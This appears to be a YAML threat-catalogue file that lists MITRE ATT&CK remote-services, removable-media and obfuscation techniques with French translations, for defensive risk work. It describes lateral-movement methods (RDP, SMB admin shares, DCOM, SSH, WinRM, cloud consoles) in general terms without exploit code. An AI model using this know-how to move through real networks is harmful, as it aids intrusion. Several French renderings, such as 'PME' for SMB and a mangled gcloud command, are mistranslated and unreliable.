    name: Remote Desktop Protocol
    description: "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078)\
      \ to log into a computer using the Remote Desktop Protocol (RDP). The adversary\
      \ may then perform actions as the logged-on user.\n\nRemote desktop is a common\
      \ feature in operating systems. It allows a user to log into an interactive\
      \ session with a system desktop graphical user interface on a remote system.\
      \ Microsoft refers to its implementation of the Remote Desktop Protocol (RDP)\
      \ as Remote Desktop Services (RDS).(Citation: TechNet Remote Desktop Services)\
      \ \n\nAdversaries may connect to a remote system over RDP/RDS to expand access\
      \ if the service is enabled and allows access to accounts with known credentials.\
      \ Adversaries will likely use Credential Access techniques to acquire credentials\
      \ to use with RDP. Adversaries may also use RDP in conjunction with the [Accessibility\
      \ Features](https://attack.mitre.org/techniques/T1546/008) or [Terminal Services\
      \ DLL](https://attack.mitre.org/techniques/T1505/005) for Persistence.(Citation:\
      \ Alperovitch Malware)\nhttps://attack.mitre.org/techniques/T1021/001"
    translations:
      fr:
        name: "Protocole de bureau \xE0 distance"
        description: "Les adversaires peuvent utiliser [Comptes valides](https://attack.mitre.org/techniques/T1078)\
          \ pour se connecter \xE0 un ordinateur en utilisant le protocole de bureau\
          \ distant (RDP). L\u2019adversaire peut alors effectuer des actions en tant\
          \ qu\u2019utilisateur connect\xE9.\n\nLe bureau \xE0 distance est une fonctionnalit\xE9\
          \ courante dans les syst\xE8mes d\u2019exploitation. Il permet \xE0 un utilisateur\
          \ de se connecter \xE0 une session interactive via une interface graphique\
          \ de bureau syst\xE8me via un syst\xE8me distant. Microsoft d\xE9signe sa\
          \ mise en \u0153uvre du protocole de bureau \xE0 distance (RDP) sous le\
          \ nom de services de bureau \xE0 distance (RDS). (Citation : Services de\
          \ bureau \xE0 distance TechNet) \n\nLes adversaires peuvent se connecter\
          \ \xE0 un syst\xE8me distant via RDP/RDS pour \xE9tendre l\u2019acc\xE8\
          s si le service est activ\xE9 et permet l\u2019acc\xE8s \xE0 des comptes\
          \ avec des identifiants connus. Les adversaires utiliseront probablement\
          \ des techniques d\u2019acc\xE8s aux accr\xE9ditations pour obtenir des\
          \ identifiants \xE0 utiliser avec RDP. Les adversaires peuvent \xE9galement\
          \ utiliser la RDP en conjonction avec les [Fonctionnalit\xE9s d\u2019accessibilit\xE9\
          ](https://attack.mitre.org/techniques/T1546/008) ou [DLL de services terminaux](https://attack.mitre.org/techniques/T1505/005)\
          \ pour la persistance. (Citation : Alperovitch Malware)\nhttps://attack.mitre.org/techniques/T1021/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1021.002
    ref_id: T1021.002
    name: SMB/Windows Admin Shares
    description: 'Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078)
      to interact with a remote network share using Server Message Block (SMB). The
      adversary may then perform actions as the logged-on user.


      SMB is a file, printer, and serial port sharing protocol for Windows machines
      on the same network or domain. Adversaries may use SMB to interact with file
      shares, allowing them to move laterally throughout a network. Linux and macOS
      implementations of SMB typically use Samba.


      Windows systems have hidden network shares that are accessible only to administrators
      and provide the ability for remote file copy and other administrative functions.
      Example network shares include `C$`, `ADMIN$`, and `IPC$`. Adversaries may use
      this technique in conjunction with administrator-level [Valid Accounts](https://attack.mitre.org/techniques/T1078)
      to remotely access a networked system over SMB,(Citation: Wikipedia Server Message
      Block) to interact with systems using remote procedure calls (RPCs),(Citation:
      TechNet RPC) transfer files, and run transferred binaries through remote Execution.
      Example execution techniques that rely on authenticated sessions over SMB/RPC
      are [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Service
      Execution](https://attack.mitre.org/techniques/T1569/002), and [Windows Management
      Instrumentation](https://attack.mitre.org/techniques/T1047). Adversaries can
      also use NTLM hashes to access administrator shares on systems with [Pass the
      Hash](https://attack.mitre.org/techniques/T1550/002) and certain configuration
      and patch levels.(Citation: Microsoft Admin Shares)

      https://attack.mitre.org/techniques/T1021/002'
    translations:
      fr:
        name: Partages PME/Administration Windows
        description: "Les adversaires peuvent utiliser [Comptes valides](https://attack.mitre.org/techniques/T1078)\
          \ pour interagir avec un partage r\xE9seau distant en utilisant Server Message\
          \ Block (SMB). L\u2019adversaire peut alors effectuer des actions en tant\
          \ qu\u2019utilisateur connect\xE9.\n\nSMB est un protocole de partage de\
          \ fichiers, d\u2019imprimantes et de ports s\xE9rie pour les machines Windows\
          \ sur le m\xEAme r\xE9seau ou domaine. Les adversaires peuvent utiliser\
          \ les PME pour interagir avec les partages de fichiers, leur permettant\
          \ de se d\xE9placer lat\xE9ralement \xE0 travers un r\xE9seau. Les impl\xE9\
          mentations de SMB sur Linux et macOS utilisent g\xE9n\xE9ralement Samba.\n\
          \nLes syst\xE8mes Windows disposent de partages r\xE9seau cach\xE9s accessibles\
          \ uniquement aux administrateurs et offrent la possibilit\xE9 de copier\
          \ des fichiers \xE0 distance et d\u2019autres fonctions administratives.\
          \ Exemples de partages r\xE9seau incluent \xAB C$ \xBB, \xAB ADMIN$ \xBB\
          \ et \xAB IPC$ \xBB. Les adversaires peuvent utiliser cette technique en\
          \ conjonction avec des [comptes valides](https://attack.mitre.org/techniques/T1078)\
          \ au niveau administrateur pour acc\xE9der \xE0 distance \xE0 un syst\xE8\
          me en r\xE9seau via SMB,(Citation : Wikipedia Server Message Block) pour\
          \ interagir avec des syst\xE8mes via des appels de proc\xE9dure distants\
          \ (RPC), (Citation : TechNet RPC) des fichiers de transfert, et ex\xE9cuter\
          \ des binaires transf\xE9r\xE9s via une ex\xE9cution distante. Des exemples\
          \ de techniques d\u2019ex\xE9cution reposant sur des sessions authentifi\xE9\
          es via SMB/RPC sont [Scheduled Task](https://attack.mitre.org/techniques/T1053),\
          \ [Service Execution](https://attack.mitre.org/techniques/T1569/002) et\
          \ [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).\
          \ Les adversaires peuvent \xE9galement utiliser des hachages NTLM pour acc\xE9\
          der aux partages administrateur sur les syst\xE8mes avec [Pass the Hash](https://attack.mitre.org/techniques/T1550/002)\
          \ et certains niveaux de configuration et de patch. (Citation : Partages\
          \ administratifs Microsoft)\nhttps://attack.mitre.org/techniques/T1021/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1021.003
    ref_id: T1021.003
    name: Distributed Component Object Model
    description: 'Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078)
      to interact with remote machines by taking advantage of Distributed Component
      Object Model (DCOM). The adversary may then perform actions as the logged-on
      user.


      The Windows Component Object Model (COM) is a component of the native Windows
      application programming interface (API) that enables interaction between software
      objects, or executable code that implements one or more interfaces. Through
      COM, a client object can call methods of server objects, which are typically
      Dynamic Link Libraries (DLL) or executables (EXE). Distributed COM (DCOM) is
      transparent middleware that extends the functionality of COM beyond a local
      computer using remote procedure call (RPC) technology.(Citation: Fireeye Hunting
      COM June 2019)(Citation: Microsoft COM)


      Permissions to interact with local and remote server COM objects are specified
      by access control lists (ACL) in the Registry.(Citation: Microsoft Process Wide
      Com Keys) By default, only Administrators may remotely activate and launch COM
      objects through DCOM.(Citation: Microsoft COM ACL)


      Through DCOM, adversaries operating in the context of an appropriately privileged
      user can remotely obtain arbitrary and even direct shellcode execution through
      Office applications(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017)
      as well as other Windows objects that contain insecure methods.(Citation: Enigma
      MMC20 COM Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan 2017) DCOM can
      also execute macros in existing documents(Citation: Enigma Excel DCOM Sept 2017)
      and may also invoke [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002)
      (DDE) execution directly through a COM created instance of a Microsoft Office
      application(Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing
      the need for a malicious document. DCOM can be used as a method of remotely
      interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).
      (Citation: MSDN WMI)

      https://attack.mitre.org/techniques/T1021/003'
    translations:
      fr:
        name: "Mod\xE8le d\u2019objet \xE0 composant distribu\xE9"
        description: "Les adversaires peuvent utiliser [Comptes valides](https://attack.mitre.org/techniques/T1078)\
          \ pour interagir avec des machines distantes en tirant parti du Mod\xE8\
          le Composant Distribu\xE9 Objet (DCOM). L\u2019adversaire peut alors effectuer\
          \ des actions en tant qu\u2019utilisateur connect\xE9.\n\nLe Mod\xE8le d\u2019\
          Objet Composant Windows (COM) est un composant de l\u2019interface native\
          \ de programmation d\u2019applications Windows (API) qui permet l\u2019\
          interaction entre objets logiciels, ou du code ex\xE9cutable impl\xE9mentant\
          \ une ou plusieurs interfaces. Via COM, un objet client peut appeler des\
          \ m\xE9thodes d\u2019objets serveur, qui sont g\xE9n\xE9ralement des biblioth\xE8\
          ques de liaison dynamique (DLL) ou des ex\xE9cutables (EXE). Le COM distribu\xE9\
          \ (DCOM) est un middleware transparent qui \xE9tend la fonctionnalit\xE9\
          \ du COM au-del\xE0 d\u2019un ordinateur local en utilisant la technologie\
          \ d\u2019appel de proc\xE9dure \xE0 distance (RPC). (Citation : Fireeye\
          \ Hunting COM juin 2019)(Citation : Microsoft COM)\n\nLes permissions d\u2019\
          interagir avec les objets COM du serveur local et distant sont sp\xE9cifi\xE9\
          es par des listes de contr\xF4le d\u2019acc\xE8s (ACL) dans le Registre.\
          \ (Citation : Microsoft Process Wide Com Keys) Par d\xE9faut, seuls les\
          \ administrateurs peuvent activer et lancer \xE0 distance des objets COM\
          \ via DCOM. (Citation : Microsoft COM ACL)\n\nGr\xE2ce \xE0 DCOM, les adversaires\
          \ op\xE9rant dans le contexte d\u2019un utilisateur privil\xE9gi\xE9 peuvent\
          \ obtenir \xE0 distance une ex\xE9cution arbitraire et m\xEAme directe de\
          \ shellcode via des applications Office (Citation : Enigma Outlook DCOM\
          \ Lateral Movement nov. 2017) ainsi que d\u2019autres objets Windows contenant\
          \ des m\xE9thodes non s\xE9curis\xE9es. (Citation : Enigma MMC20 COM janv.\
          \ 2017)(Citation : Mouvement lat\xE9ral Enigma DCOM janv. 2017) DCOM peut\
          \ \xE9galement ex\xE9cuter des macros dans des documents existants (Citation\
          \ : Enigma Excel DCOM sept. 2017) et peut \xE9galement invoquer l\u2019\
          ex\xE9cution [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1559/002)\
          \ (DDE) directement via une instance cr\xE9\xE9e par COM d\u2019une application\
          \ Microsoft Office (Citation : Cyberreason DCOM DDE Lateral Movement nov.\
          \ 2017), contournant le besoin d\u2019un document malveillant. DCOM peut\
          \ \xEAtre utilis\xE9 comme m\xE9thode d\u2019interaction \xE0 distance avec\
          \ [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).\
          \ (Citation : MSDN WMI)\nhttps://attack.mitre.org/techniques/T1021/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1021.004
    ref_id: T1021.004
    name: SSH
    description: "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078)\
      \ to log into remote machines using Secure Shell (SSH). The adversary may then\
      \ perform actions as the logged-on user.\n\nSSH is a protocol that allows authorized\
      \ users to open remote shells on other computers. Many Linux and macOS versions\
      \ come with SSH installed by default, although typically disabled until the\
      \ user enables it. On ESXi, SSH can be enabled either directly on the host (e.g.,\
      \ via `vim-cmd hostsvc/enable_ssh`) or via vCenter.(Citation: Sygnia ESXi Ransomware\
      \ 2025)(Citation: TrendMicro ESXI Ransomware)(Citation: Sygnia Abyss Locker\
      \ 2025) The SSH server can be configured to use standard password authentication\
      \ or public-private keypairs in lieu of or in addition to a password. In this\
      \ authentication scenario, the user\u2019s public key must be in a special file\
      \ on the computer running the server that lists which keypairs are allowed to\
      \ login as that user (i.e., [SSH Authorized Keys](https://attack.mitre.org/techniques/T1098/004)).\n\
      https://attack.mitre.org/techniques/T1021/004"
    translations:
      fr:
        name: SSH
        description: "Les adversaires peuvent utiliser [Comptes valides](https://attack.mitre.org/techniques/T1078)\
          \ pour se connecter \xE0 des machines distantes via Secure Shell (SSH).\
          \ L\u2019adversaire peut alors effectuer des actions en tant qu\u2019utilisateur\
          \ connect\xE9.\n\nSSH est un protocole qui permet aux utilisateurs autoris\xE9\
          s d\u2019ouvrir des shells \xE0 distance sur d\u2019autres ordinateurs.\
          \ De nombreuses versions de Linux et macOS sont livr\xE9es avec SSH install\xE9\
          \ par d\xE9faut, bien que g\xE9n\xE9ralement d\xE9sactiv\xE9 jusqu\u2019\
          \xE0 ce que l\u2019utilisateur l\u2019active. Sur ESXi, le SSH peut \xEA\
          tre activ\xE9 directement sur l\u2019h\xF4te (par exemple, via 'vim-cmd\
          \ hostsvc/enable_ssh'), soit via vCenter. (Citation : Sygnia ESXi Ransomware\
          \ 2025)(Citation : Ransomware TrendMicro ESXI)(Citation : Sygnia Abyss Locker\
          \ 2025) Le serveur SSH peut \xEAtre configur\xE9 pour utiliser une authentification\
          \ par mot de passe standard ou des paires de cl\xE9s public-priv\xE9 en\
          \ remplacement ou en compl\xE9ment d\u2019un mot de passe. Dans ce sc\xE9\
          nario d\u2019authentification, la cl\xE9 publique de l\u2019utilisateur\
          \ doit se trouver dans un fichier sp\xE9cial sur l\u2019ordinateur ex\xE9\
          cutant le serveur qui indique quelles paires de cl\xE9s sont autoris\xE9\
          es \xE0 se connecter en tant qu\u2019utilisateur (c\u2019est-\xE0-dire [SSH\
          \ Authorized Keys](https://attack.mitre.org/techniques/T1098/004)).\nhttps://attack.mitre.org/techniques/T1021/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1021.005
    ref_id: T1021.005
    name: VNC
    description: "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078)\
      \ to remotely control machines using Virtual Network Computing (VNC).  VNC is\
      \ a platform-independent desktop sharing system that uses the RFB (\u201Cremote\
      \ framebuffer\u201D) protocol to enable users to remotely control another computer\u2019\
      s display by relaying the screen, mouse, and keyboard inputs over the network.(Citation:\
      \ The Remote Framebuffer Protocol)\n\nVNC differs from [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001)\
      \ as VNC is screen-sharing software rather than resource-sharing software. By\
      \ default, VNC uses the system's authentication, but it can be configured to\
      \ use credentials specific to VNC.(Citation: MacOS VNC software for Remote Desktop)(Citation:\
      \ VNC Authentication)\n\nAdversaries may abuse VNC to perform malicious actions\
      \ as the logged-on user such as opening documents, downloading files, and running\
      \ arbitrary commands. An adversary could use VNC to remotely control and monitor\
      \ a system to collect data and information to pivot to other systems within\
      \ the network. Specific VNC libraries/implementations have also been susceptible\
      \ to brute force attacks and memory usage exploitation.(Citation: Hijacking\
      \ VNC)(Citation: macOS root VNC login without authentication)(Citation: VNC\
      \ Vulnerabilities)(Citation: Offensive Security VNC Authentication Check)(Citation:\
      \ Attacking VNC Servers PentestLab)(Citation: Havana authentication bug)\nhttps://attack.mitre.org/techniques/T1021/005"
    translations:
      fr:
        name: VNC
        description: "Les adversaires peuvent utiliser [Comptes valides](https://attack.mitre.org/techniques/T1078)\
          \ pour contr\xF4ler \xE0 distance des machines en utilisant le Virtual Network\
          \ Computing (VNC).  VNC est un syst\xE8me de partage de bureau ind\xE9pendant\
          \ de la plateforme qui utilise le protocole RFB (\xAB\_remote framebuffer\_\
          \xBB) pour permettre aux utilisateurs de contr\xF4ler \xE0 distance l\u2019\
          affichage d\u2019un autre ordinateur en relayant les entr\xE9es de l\u2019\
          \xE9cran, de la souris et du clavier via le r\xE9seau. (Citation : Le protocole\
          \ de framebuffer \xE0 distance)\n\nVNC diff\xE8re du [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001)\
          \ car le VNC est un logiciel de partage d\u2019\xE9cran plut\xF4t qu\u2019\
          un logiciel de partage de ressources. Par d\xE9faut, VNC utilise l\u2019\
          authentification du syst\xE8me, mais il peut \xEAtre configur\xE9 pour utiliser\
          \ des identifiants sp\xE9cifiques \xE0 VNC. (Citation : Logiciel VNC MacOS\
          \ pour bureau \xE0 distance)(Citation : Authentification VNC)\n\nLes adversaires\
          \ peuvent abuser du VNC pour effectuer des actions malveillantes en tant\
          \ qu\u2019utilisateur connect\xE9, telles que l\u2019ouverture de documents,\
          \ le t\xE9l\xE9chargement de fichiers ou l\u2019ex\xE9cution de commandes\
          \ arbitraires. Un adversaire pourrait utiliser le VNC pour contr\xF4ler\
          \ et surveiller \xE0 distance un syst\xE8me afin de collecter des donn\xE9\
          es et des informations afin de les transf\xE9rer vers d\u2019autres syst\xE8\
          mes du r\xE9seau. Certaines biblioth\xE8ques/impl\xE9mentations VNC ont\
          \ \xE9galement \xE9t\xE9 vuln\xE9rables aux attaques par force brute et\
          \ \xE0 l\u2019exploitation de la m\xE9moire. (Citation : D\xE9tournement\
          \ de VNC)(Citation : connexion VNC root macOS sans authentification)(Citation\
          \ : Vuln\xE9rabilit\xE9s VNC)(Citation : V\xE9rification d\u2019authentification\
          \ VNC de s\xE9curit\xE9 offensive)(Citation : Attaque des serveurs VNC PentestLab)(Citation\
          \ : Bug d\u2019authentification \xE0 La Havane)\nhttps://attack.mitre.org/techniques/T1021/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1021.006
    ref_id: T1021.006
    name: Windows Remote Management
    description: 'Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078)
      to interact with remote systems using Windows Remote Management (WinRM). The
      adversary may then perform actions as the logged-on user.


      WinRM is the name of both a Windows service and a protocol that allows a user
      to interact with a remote system (e.g., run an executable, modify the Registry,
      modify services).(Citation: Microsoft WinRM) It may be called with the `winrm`
      command or by any number of programs such as PowerShell.(Citation: Jacobsen
      2014) WinRM  can be used as a method of remotely interacting with [Windows Management
      Instrumentation](https://attack.mitre.org/techniques/T1047).(Citation: MSDN
      WMI)

      https://attack.mitre.org/techniques/T1021/006'
    translations:
      fr:
        name: "Gestion \xE0 distance de Windows"
        description: "Les adversaires peuvent utiliser [Comptes valides](https://attack.mitre.org/techniques/T1078)\
          \ pour interagir avec des syst\xE8mes distants via Windows Remote Management\
          \ (WinRM). L\u2019adversaire peut alors effectuer des actions en tant qu\u2019\
          utilisateur connect\xE9.\n\nWinRM est le nom \xE0 la fois d\u2019un service\
          \ Windows et d\u2019un protocole permettant \xE0 un utilisateur d\u2019\
          interagir avec un syst\xE8me distant (par exemple, ex\xE9cuter un ex\xE9\
          cutable, modifier le Registre, modifier des services). (Citation : Microsoft\
          \ WinRM) Il peut \xEAtre appel\xE9 avec la commande 'winrm' ou par de nombreux\
          \ programmes tels que PowerShell. (Citation : Jacobsen 2014) WinRM peut\
          \ \xEAtre utilis\xE9 comme m\xE9thode d\u2019interaction \xE0 distance avec\
          \ [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).\
          \ (Citation : MSDN WMI)\nhttps://attack.mitre.org/techniques/T1021/006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1021.007
    ref_id: T1021.007
    name: Cloud Services
    description: "Adversaries may log into accessible cloud services within a compromised\
      \ environment using [Valid Accounts](https://attack.mitre.org/techniques/T1078)\
      \ that are synchronized with or federated to on-premises user identities. The\
      \ adversary may then perform management actions or access cloud-hosted resources\
      \ as the logged-on user. \n\nMany enterprises federate centrally managed user\
      \ identities to cloud services, allowing users to login with their domain credentials\
      \ in order to access the cloud control plane. Similarly, adversaries may connect\
      \ to available cloud services through the web console or through the cloud command\
      \ line interface (CLI) (e.g., [Cloud API](https://attack.mitre.org/techniques/T1059/009)),\
      \ using commands such as <code>Connect-AZAccount</code> for Azure PowerShell,\
      \ <code>Connect-MgGraph</code> for Microsoft Graph PowerShell, and <code>gcloud\
      \ auth login</code> for the Google Cloud CLI.\n\nIn some cases, adversaries\
      \ may be able to authenticate to these services via [Application Access Token](https://attack.mitre.org/techniques/T1550/001)\
      \ instead of a username and password.\nhttps://attack.mitre.org/techniques/T1021/007"
    translations:
      fr:
        name: Cloud Services
        description: "Les adversaires peuvent se connecter \xE0 des services cloud\
          \ accessibles dans un environnement compromis en utilisant des [Comptes\
          \ valides](https://attack.mitre.org/techniques/T1078) qui sont synchronis\xE9\
          s avec ou f\xE9d\xE9r\xE9s vers des identit\xE9s d\u2019utilisateurs sur\
          \ site. L\u2019adversaire peut alors effectuer des actions de gestion ou\
          \ acc\xE9der \xE0 des ressources h\xE9berg\xE9es dans le cloud en tant qu\u2019\
          utilisateur connect\xE9. \n\nDe nombreuses entreprises f\xE9d\xE9rent les\
          \ identit\xE9s d\u2019utilisateur g\xE9r\xE9es centralis\xE9ment vers des\
          \ services cloud, permettant aux utilisateurs de se connecter avec leurs\
          \ identifiants de domaine afin d\u2019acc\xE9der au plan de contr\xF4le\
          \ cloud. De m\xEAme, les adversaires peuvent se connecter \xE0 des services\
          \ cloud disponibles via la console web ou via l\u2019interface en ligne\
          \ de commande (CLI) (par exemple, [Cloud API](https://attack.mitre.org/techniques/T1059/009)),\
          \ en utilisant des commandes telles que <code>Connect-AZAccount</code> pour\
          \ Azure PowerShell, <code>Connect-MgGraph</code> pour Microsoft Graph PowerShell\
          \ et <code>la connexion auth gcloud</code> pour la interface Google Cloud.\n\
          \nDans certains cas, les adversaires peuvent \xEAtre capables de s\u2019\
          authentifier \xE0 ces services via [Application Access Token](https://attack.mitre.org/techniques/T1550/001)\
          \ au lieu d\u2019un nom d\u2019utilisateur et d\u2019un mot de passe.\n\
          https://attack.mitre.org/techniques/T1021/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1021.008
    ref_id: T1021.008
    name: Direct Cloud VM Connections
    description: "Adversaries may leverage [Valid Accounts](https://attack.mitre.org/techniques/T1078)\
      \ to log directly into accessible cloud hosted compute infrastructure through\
      \ cloud native methods. Many cloud providers offer interactive connections to\
      \ virtual infrastructure that can be accessed through the [Cloud API](https://attack.mitre.org/techniques/T1059/009),\
      \ such as Azure Serial Console(Citation: Azure Serial Console), AWS EC2 Instance\
      \ Connect(Citation: EC2 Instance Connect)(Citation: lucr-3: Getting SaaS-y in\
      \ the cloud), and AWS System Manager.(Citation: AWS System Manager).\n\nMethods\
      \ of authentication for these connections can include passwords, application\
      \ access tokens, or SSH keys. These cloud native methods may, by default, allow\
      \ for privileged access on the host with SYSTEM or root level access. \n\nAdversaries\
      \ may utilize these cloud native methods to directly access virtual infrastructure\
      \ and pivot through an environment.(Citation: SIM Swapping and Abuse of the\
      \ Microsoft Azure Serial Console) These connections typically provide direct\
      \ console access to the VM rather than the execution of scripts (i.e., [Cloud\
      \ Administration Command](https://attack.mitre.org/techniques/T1651)).\nhttps://attack.mitre.org/techniques/T1021/008"
    translations:
      fr:
        name: Connexions VM Direct Cloud
        description: "Les adversaires peuvent utiliser [Comptes valides](https://attack.mitre.org/techniques/T1078)\
          \ pour se connecter directement \xE0 une infrastructure informatique cloud\
          \ accessible via des m\xE9thodes natives cloud. De nombreux fournisseurs\
          \ cloud proposent des connexions interactives vers des infrastructures virtuelles\
          \ accessibles via l'[API cloud](https://attack.mitre.org/techniques/T1059/009),\
          \ telles que Azure Serial Console (citation : Azure Serial Console), AWS\
          \ EC2 Instance Connect (citation : EC2 Instance Connect) (citation : lucr-3\
          \ : Getting SaaS-y dans le cloud), et AWS System Manager. (Citation : AWS\
          \ System Manager).\n\nLes m\xE9thodes d\u2019authentification pour ces connexions\
          \ peuvent inclure des mots de passe, des jetons d\u2019acc\xE8s applicatifs\
          \ ou des cl\xE9s SSH. Ces m\xE9thodes natives du cloud peuvent, par d\xE9\
          faut, permettre un acc\xE8s privil\xE9gi\xE9 sur l\u2019h\xF4te avec un\
          \ acc\xE8s au niveau SYST\xC8ME ou racine. \n\nLes adversaires peuvent utiliser\
          \ ces m\xE9thodes native cloud pour acc\xE9der directement \xE0 l\u2019\
          infrastructure virtuelle et pivoter dans un environnement. (Citation : \xC9\
          change de SIM et abus de la console s\xE9rie Microsoft Azure) Ces connexions\
          \ offrent g\xE9n\xE9ralement un acc\xE8s direct \xE0 la console virtuelle\
          \ plut\xF4t que l\u2019ex\xE9cution de scripts (par exemple, [Cloud Administration\
          \ Command](https://attack.mitre.org/techniques/T1651)).\nhttps://attack.mitre.org/techniques/T1021/008"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1025
    ref_id: T1025
    name: Data from Removable Media
    description: "Adversaries may search connected removable media on computers they\
      \ have compromised to find files of interest. Sensitive data can be collected\
      \ from any removable media (optical disk drive, USB memory, etc.) connected\
      \ to the compromised system prior to Exfiltration. Interactive command shells\
      \ may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106)\
      \ may be used to gather information. \n\nSome adversaries may also use [Automated\
      \ Collection](https://attack.mitre.org/techniques/T1119) on removable media.\n\
      https://attack.mitre.org/techniques/T1025"
    translations:
      fr:
        name: "Donn\xE9es issues de supports amovibles"
        description: "Les adversaires peuvent fouiller les supports amovibles connect\xE9\
          s sur des ordinateurs qu\u2019ils ont compromis pour trouver des fichiers\
          \ d\u2019int\xE9r\xEAt. Les donn\xE9es sensibles peuvent \xEAtre collect\xE9\
          es \xE0 partir de tout support amovible (disque optique, m\xE9moire USB,\
          \ etc.) connect\xE9 au syst\xE8me compromis avant l\u2019Exfiltration. Des\
          \ shells de commande interactifs peuvent \xEAtre utilis\xE9s, et des fonctionnalit\xE9\
          s courantes dans [cmd](https://attack.mitre.org/software/S0106) peuvent\
          \ \xEAtre utilis\xE9es pour recueillir des informations. \n\nCertains adversaires\
          \ peuvent \xE9galement utiliser [Collecte automatis\xE9e](https://attack.mitre.org/techniques/T1119)\
          \ sur les supports amovibles.\nhttps://attack.mitre.org/techniques/T1025"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1027
    ref_id: T1027
    name: Obfuscated Files or Information
    description: "Adversaries may attempt to make an executable or file difficult\
      \ to discover or analyze by encrypting, encoding, or otherwise obfuscating its\
      \ contents on the system or in transit. This is common behavior that can be\
      \ used across different platforms and the network to evade defenses. \n\nPayloads\
      \ may be compressed, archived, or encrypted in order to avoid detection. These\
      \ payloads may be used during Initial Access or later to mitigate detection.\
      \ Sometimes a user's action may be required to open and [Deobfuscate/Decode\
      \ Files or Information](https://attack.mitre.org/techniques/T1140) for [User\
      \ Execution](https://attack.mitre.org/techniques/T1204). The user may also be\
      \ required to input a password to open a password protected compressed/encrypted\
      \ file that was provided by the adversary.(Citation: Volexity PowerDuke November\
      \ 2016) Adversaries may also use compressed or archived scripts, such as JavaScript.\
      \ \n\nPortions of files can also be encoded to hide the plain-text strings that\
      \ would otherwise help defenders with discovery.(Citation: Linux/Cdorked.A We\
      \ Live Security Analysis) Payloads may also be split into separate, seemingly\
      \ benign files that only reveal malicious functionality when reassembled.(Citation:\
      \ Carbon Black Obfuscation Sept 2016)\n\nAdversaries may also abuse [Command\
      \ Obfuscation](https://attack.mitre.org/techniques/T1027/010) to obscure commands\
      \ executed from payloads or directly via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).\
      \ Environment variables, aliases, characters, and other platform/language specific\
      \ semantics can be used to evade signature based detections and application\
      \ control mechanisms.(Citation: FireEye Obfuscation June 2017)(Citation: FireEye\
      \ Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017)"
    translations:
      fr:
        name: Fichiers ou informations obscurcies
        description: "Les adversaires peuvent tenter de rendre un ex\xE9cutable ou\
          \ un fichier difficile \xE0 d\xE9couvrir ou \xE0 analyser en chiffrent,\
          \ encodant ou obscurcissent autrement son contenu sur le syst\xE8me ou en\
          \ transit. C\u2019est un comportement courant qui peut \xEAtre utilis\xE9\
          \ sur diff\xE9rentes plateformes et sur le r\xE9seau pour \xE9chapper aux\
          \ d\xE9fenses. \n\nLes charges utiles peuvent \xEAtre compress\xE9es, archiv\xE9\
          es ou chiffr\xE9es afin d\u2019\xE9viter leur d\xE9tection. Ces charges\
          \ utiles peuvent \xEAtre utilis\xE9es lors de l\u2019Acc\xE8s Initial ou\
          \ plus tard pour att\xE9nuer la d\xE9tection. Parfois, une action d\u2019\
          un utilisateur peut \xEAtre n\xE9cessaire pour ouvrir et [D\xE9mod\xE9rer/D\xE9\
          coder des fichiers ou informations](https://attack.mitre.org/techniques/T1140)\
          \ pour [Ex\xE9cution utilisateur](https://attack.mitre.org/techniques/T1204).\
          \ L\u2019utilisateur peut \xE9galement \xEAtre oblig\xE9 d\u2019entrer un\
          \ mot de passe pour ouvrir un fichier compress\xE9/chiffr\xE9 prot\xE9g\xE9\
          \ par mot de passe fourni par l\u2019adversaire. (Citation : Volexity PowerDuke\
          \ novembre 2016) Les adversaires peuvent \xE9galement utiliser des scripts\
          \ compress\xE9s ou archiv\xE9s, tels que JavaScript. \n\nDes portions de\
          \ fichiers peuvent \xE9galement \xEAtre encod\xE9es pour masquer les cha\xEE\
          nes de texte clair qui aideraient autrement les d\xE9fenseurs \xE0 la d\xE9\
          couverte. (Citation : Linux/Cdorked.A Analyse de s\xE9curit\xE9 We Live)\
          \ Les charges utiles peuvent \xE9galement \xEAtre divis\xE9es en fichiers\
          \ s\xE9par\xE9s, apparemment inoffensifs, qui ne r\xE9v\xE8lent une fonctionnalit\xE9\
          \ malveillante qu\u2019une fois r\xE9assembl\xE9s. (Citation : Obfuscation\
          \ du noir de carbone septembre 2016)\n\nLes adversaires peuvent \xE9galement\
          \ abuser de [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010)\
          \ pour masquer les commandes ex\xE9cut\xE9es \xE0 partir des charges utiles\
          \ ou directement via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).\
          \ Les variables d\u2019environnement, les alias, les caract\xE8res et d\u2019\
          autres s\xE9mantiques sp\xE9cifiques \xE0 la plateforme/langage peuvent\
          \ \xEAtre utilis\xE9s pour \xE9chapper aux d\xE9tections bas\xE9es sur la\
          \ signature et aux m\xE9canismes de contr\xF4le applicatif. (Citation :\
          \ Obfuscation FireEye juin 2017)(Citation : FireEye Revoke-Obfuscation juillet\
          \ 2017)(Citation : PaloAlto EncodedCommand mars 2017)"
